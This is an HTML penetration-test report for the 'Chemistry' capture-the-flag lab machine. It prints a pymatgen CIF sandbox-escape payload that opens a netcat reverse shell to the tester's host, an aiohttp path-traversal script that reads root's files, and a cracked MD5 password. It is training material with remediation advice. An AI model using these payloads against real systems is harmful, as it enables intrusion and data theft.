@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Chemistry</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Chemistry</h2>
+        <h3 class="report-meta">Date: January 5, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#network-analysis">Network Analysis</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This penetration test was conducted against the HTB Chemistry machine (10.10.11.38) on January 4-5, 2025. The assessment successfully identified a chain of critical vulnerabilities, including remote code execution via file upload, credential exposure in a database, and local privilege escalation through a path traversal vulnerability, leading to complete system compromise.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>3 critical vulnerabilities</strong> identified</li>
+            <li><strong>Complete system compromise</strong> achieved (user and root)</li>
+            <li><strong>Remote Code Execution</strong> via insecure processing of Crystallographic Information Files (.cif).</li>
+            <li><strong>Credential Exposure</strong> of weakly hashed passwords in an internal database.</li>
+            <li><strong>Privilege Escalation</strong> via a path traversal vulnerability in a locally hosted web service.</li>
+        </ul>
+
+        <h3>Risk Level: CRITICAL</h3>
+        <p>The target system contains a chain of vulnerabilities that allow an unauthenticated external attacker to gain initial access, escalate privileges, and achieve full administrative control over the system.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.38</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.128</li>
+            <li><strong>Operating System:</strong> Ubuntu Linux</li>
+            <li><strong>Hostname:</strong> chemistry</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> Remote Code Execution by uploading a malicious `.cif` file that exploits a Python sandbox escape vulnerability in the file parser.</li>
+            <li><strong>Lateral Movement:</strong> Extraction and cracking of an MD5 password hash from a local SQLite database, allowing SSH access as another user.</li>
+            <li><strong>Privilege Escalation:</strong> Exploitation of a path traversal vulnerability in an internal-only web service (aiohttp) to read sensitive files owned by the root user.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Remote Code Execution via Malicious File Upload</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 9.8<br>
+        <strong>CWE:</strong> CWE-98 (Improper Control of Filename for Include/Require Statement).</p>
+        <p><strong>Description:</strong><br>
+        The web application running on port 5000 allows users to upload `.cif` files for analysis. The backend Python library (pymatgen) used to parse these files contains a vulnerability where it insecurely uses an `eval()`-like function. An attacker can craft a `.cif` file with a malicious payload that escapes the Python sandbox and executes arbitrary OS commands on the server.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Endpoint:</strong> File upload functionality at `http://10.10.11.38:5000/`</li>
+            <li><strong>Vulnerable Parameter:</strong> `_space_group_magn.transform_BNS_Pp_abc` field within the `.cif` file</li>
+            <li><strong>Information Disclosed:</strong> This vulnerability does not directly disclose information but provides a foothold on the system as the 'app' user.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>Payload embedded in the malicious `.cif` file to establish a reverse shell:</p>
+        <pre><code>_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__.__getattribute__(*[().__class__.__mro__]+["_sub" + "classes_"])() if d.__name__ == "BuiltinImporter"].load_module("os").system("busybox nc 10.10.14.128 4444 -e /bin/bash");0,0,0'</code></pre>
+        <p><strong>Impact:</strong> An unauthenticated attacker can achieve remote code execution on the server, leading to initial access and a reverse shell.</p>
+
+        <h3>Finding 2: Insufficiently Protected Credentials in Database</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.5<br>
+        <strong>CWE:</strong> CWE-327 (Use of a Broken or Risky Cryptographic Algorithm).</p>
+        <p><strong>Description:</strong><br>
+        Post-exploitation, a SQLite database file (`database.db`) was discovered on the system. This database contains user credentials, including usernames and password hashes. The password for the user `rosa` was stored using the MD5 hashing algorithm, which is considered cryptographically weak and susceptible to offline cracking.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Credential Discovery Method:</strong> Analysis of the local `database.db` file.</li>
+            <li><strong>Hashing Algorithm:</strong> MD5</li>
+            <li><strong>Credentials Found:</strong> rosa:63ed86ee9f624c7b14f1d4f43dc251a5</li>
+            <li><strong>Cracked Password:</strong> unicorniosrosados</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>Hash retrieved from the database and cracked using an online service:</p>
+        <ul>
+            <li><strong>Hash:</strong> 63ed86ee9f624c7b14f1d4f43dc251a5</li>
+            <li><strong>Type:</strong> md5</li>
+            <li><strong>Result:</strong> unicorniosrosados</li>
+        </ul>
+        <p><strong>Impact:</strong> Weakly protected credentials allowed for lateral movement from the 'app' user to the 'rosa' user via SSH, providing greater system privileges and access to user-specific files.</p>
+
+        <h3>Finding 3: Local Privilege Escalation via Path Traversal</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.8<br>
+        <strong>CWE:</strong> CWE-22 (Improper Limitation of a Pathname to a Restricted Directory).</p>
+        <p><strong>Description:</strong><br>
+        An internal web service running on `127.0.0.1:8080` was identified. This service, powered by Python's aiohttp library, was found to be vulnerable to a path traversal attack. An authenticated local user can send crafted requests to this service to read arbitrary files from the filesystem with the privileges of the service's user, which in this case led to reading the root flag.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Component:</strong> aiohttp/3.9.1 service on localhost:8080</li>
+            <li><strong>Vulnerable Endpoint:</strong> `/assets/`</li>
+            <li><strong>Exploitation Method:</strong> Crafting a URL with `../` sequences to navigate outside the intended directory.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>A bash script was used to automate the traversal and retrieve the root flag:</p>
+        <pre><code>#!/bin/bash
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="root/root.txt"
+
+for ((i=0; i&lt;15; i++)); do
+    payload+=$string
+    status_code=$(curl -s -o /dev/null -w "%{http_code}" --path-as-is "$url$payload$file")
+    echo "[+] Testing with $payload$file"
+    echo -e "\tStatus code --> $status_code"
+
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done</code></pre>
+        <p><strong>Impact:</strong> The vulnerability allows a low-privileged local user to read sensitive files from anywhere on the filesystem, including SSH keys and flags, leading to full privilege escalation.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance (Jan 4, 18:08 GMT)</h3>
+        <ul>
+            <li><strong>Network Scan:</strong> Identified open TCP ports 22 (SSH) and 5000 (HTTP).</li>
+            <li><strong>Service Analysis:</strong> Discovered a "Chemistry CIF Analyzer" web application on port 5000 running on Werkzeug/3.0.3 and Python/3.9.5.</li>
+        </ul>
+
+        <h3>Phase 2: Initial Access (Jan 4, ~18:20 GMT)</h3>
+        <ul>
+            <li><strong>Vulnerability Research:</strong> Identified that `.cif` file parsers can be vulnerable to code execution.</li>
+            <li><strong>Payload Crafting:</strong> Created a malicious `.cif` file with a Python sandbox escape payload.</li>
+            <li><strong>RCE Achieved:</strong> Uploaded the file and received a reverse shell as the `app` user.</li>
+        </ul>
+        
+        <h3>Phase 3: Credential Harvesting & Lateral Movement (Jan 4, ~19:00 GMT)</h3>
+        <ul>
+            <li><strong>Internal Enumeration:</strong> Found `database.db` file in the web application directory.</li>
+            <li><strong>Hash Extraction:</strong> Extracted the MD5 hash for user `rosa`.</li>
+            <li><strong>Offline Cracking:</strong> Cracked the hash to reveal the password `unicorniosrosados`.</li>
+            <li><strong>SSH Access:</strong> Successfully logged in as `rosa` via SSH.</li>
+        </ul>
+
+        <h3>Phase 4: Privilege Escalation (Jan 5, ~12:15 GMT)</h3>
+        <ul>
+            <li><strong>Local Reconnaissance:</strong> Discovered a web service listening on `127.0.0.1:8080`.</li>
+            <li><strong>Service Identification:</strong> Identified the service as Python aiohttp/3.9.1.</li>
+            <li><strong>Vulnerability Discovery:</strong> Identified the service as vulnerable to Path Traversal.</li>
+            <li><strong>Root Access:</strong> Exploited the vulnerability to read `/root/root.txt`.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code># Nmap 7.94SVN scan initiated Sat Jan 4 18:08:46 2025
+Nmap scan report for 10.10.11.38
+Host is up (0.078s latency).
+Not shown: 65165 closed tcp ports (reset), 368 filtered tcp ports (no-response)
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+5000/tcp open  upnp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/3.0.3 Python/3.9.5
+|     Content-Type: text/html; charset=utf-8
+|_    &lt;title&gt;Chemistry CIF Analyzer&lt;/title&gt;</code></pre>
+        <h3>UDP Port Scan</h3>
+        <pre><code>All 65535 scanned ports on 10.10.11.38 are in ignored states.
+Not shown: 65141 open|filtered udp ports (no-response), 394 closed udp ports (port-unreach)</code></pre>
+        <p><strong>Key Services:</strong></p>
+        <ul>
+            <li><strong>SSH (22/tcp):</strong> OpenSSH 8.2p1</li>
+            <li><strong>HTTP (5000/tcp):</strong> Python Werkzeug 3.0.3 web server</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="network-analysis">NETWORK ANALYSIS</h2>
+        <h3>Internal Network Connections</h3>
+        <p>Post-exploitation analysis as user `rosa` revealed an internal-only service listening on the loopback address. This service was critical for the privilege escalation phase.</p>
+        <pre><code>rosa@chemistry:/$ netstat -an
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+...
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
+...</code></pre>
+
+        <hr>
+
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>CRITICAL PRIORITY</h3>
+        <ol>
+            <li><strong>Sanitize File Uploads:</strong> Implement strict input validation and use a safe parsing library for `.cif` files that does not rely on `eval()` or similar dangerous functions. Update the `pymatgen` library to a patched version (2024.2.20 or later).</li>
+            <li><strong>Patch Path Traversal:</strong> Update the `aiohttp` library to a patched version (3.9.2 or later) to remediate the path traversal vulnerability.</li>
+            <li><strong>Secure Credentials:</strong> Immediately change the password for the `rosa` user. Implement a strong, modern, and salted hashing algorithm (e.g., Argon2, bcrypt) for all user passwords stored in the database.</li>
+        </ol>
+
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Principle of Least Privilege:</strong> Run web services with the minimum permissions necessary. The 'app' user should not have read access to sensitive files like the application's database.</li>
+            <li><strong>Dependency Management:</strong> Regularly scan and update all third-party libraries (e.g., Werkzeug, pymatgen, aiohttp) to their latest stable and secure versions.</li>
+        </ol>
+
+        <h3>MEDIUM PRIORITY</h3>
+        <ol>
+            <li><strong>Security Headers:</strong> Implement security headers such as `X-Frame-Options` and `X-Content-Type-Options` on the web application to mitigate clickjacking and MIME-type sniffing attacks.</li>
+            <li><strong>Logging and Monitoring:</strong> Implement robust logging for the web application to detect anomalous activities such as traversal attempts and malformed file uploads.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/rosa/user.txt</li>
+            <li><strong>Value:</strong> db4ec9db705bdb2c6e4cc7821b44e9da</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> bf5cc17cad186157f628eccf13677d64</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>RCE Payload:</strong> Maliciously crafted `.cif` file.</li>
+            <li><strong>Compromised Hash:</strong> rosa:63ed86ee9f624c7b14f1d4f43dc251a5</li>
+            <li><strong>Privilege Escalation Script:</strong> `exploit.sh` for aiohttp path traversal.</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The HTB Chemistry machine demonstrates a classic chained attack path where multiple, distinct vulnerabilities were exploited sequentially to achieve full system compromise. The initial entry point was a critical code execution vulnerability in a file parsing library, highlighting the risks of processing untrusted user input with unsafe functions. Subsequent lateral movement was made possible by poor credential hygiene (weak hashing), and final privilege escalation was achieved by exploiting a path traversal flaw in an unpatched internal service.</p>
+        
+        <p><strong>Business Risk:</strong> HIGH - A public-facing web service contains a critical vulnerability that allows an unauthenticated attacker to execute code, leading to a full compromise of the server and potential exposure of all stored data.</p>
+        <p><strong>Technical Risk:</strong> The combination of an RCE vulnerability in a file upload function, weak password hashing, and a path traversal vulnerability in a local service creates a clear and repeatable path to full administrative control.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> January 5, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>```
